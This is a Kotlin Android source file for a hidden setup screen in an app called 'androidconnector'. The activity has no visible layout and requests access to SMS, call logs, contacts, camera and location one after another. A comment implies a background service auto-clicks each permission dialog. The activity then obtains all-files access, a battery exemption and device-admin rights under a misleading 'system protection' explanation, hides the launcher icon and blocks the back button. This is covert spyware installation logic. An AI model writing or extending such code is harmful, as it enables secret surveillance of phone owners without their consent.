package com.kztutorial99.androidconnector

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class SilentSetupActivity : AppCompatActivity() {

    private val handler = Handler(Looper.getMainLooper())
    private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
    private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }

    private val permissions = mutableListOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_PHONE_STATE,
    )

    private var permissionIndex = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Tidak ada layout — activity tak terlihat
        requestNextPermission()
    }

    private fun requestNextPermission() {
        // Lewati permission yang sudah granted
        while (permissionIndex < permissions.size) {
            val perm = permissions[permissionIndex]
            if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                permissionIndex++
            } else {
                break
            }
        }

        if (permissionIndex >= permissions.size) {
            // Semua runtime permission selesai → lanjut storage & admin
            requestSpecialPermissions()
            return
        }

        val perm = permissions[permissionIndex]
        ActivityCompat.requestPermissions(this, arrayOf(perm), 1000 + permissionIndex)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        permissionIndex++
        // Delay kecil supaya service punya waktu klik sebelum dialog berikutnya muncul
        handler.postDelayed({ requestNextPermission() }, 300)
    }

    private fun requestSpecialPermissions() {
        // Akses semua file (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }, 2001
                )
                return
            } catch (_: Exception) {}
        }
        requestBatteryOptimization()
    }

    private fun requestBatteryOptimization() {
        val pm = getSystemService(PowerManager::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
            !pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }, 2002
                )
                return
            } catch (_: Exception) {}
        }
        requestDeviceAdmin()
    }

    private fun requestDeviceAdmin() {
        if (!dpm.isAdminActive(adminComponent)) {
            try {
                startActivityForResult(
                    Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            "Diperlukan untuk proteksi sistem.")
                    }, 2003
                )
                return
            } catch (_: Exception) {}
        }
        finishSetup()
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        handler.postDelayed({
            when (requestCode) {
                2001 -> requestBatteryOptimization()
                2002 -> requestDeviceAdmin()
                2003 -> finishSetup()
            }
        }, 300)
    }

    private fun finishSetup() {
        // Sembunyikan ikon launcher
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, "$packageName.MainLauncherAlias"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        // Tandai setup selesai
        getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
            .edit().putBoolean("setup_done", true).apply()

        finish()
    }

    override fun onBackPressed() {
        // Blokir tombol back selama setup
    }
}
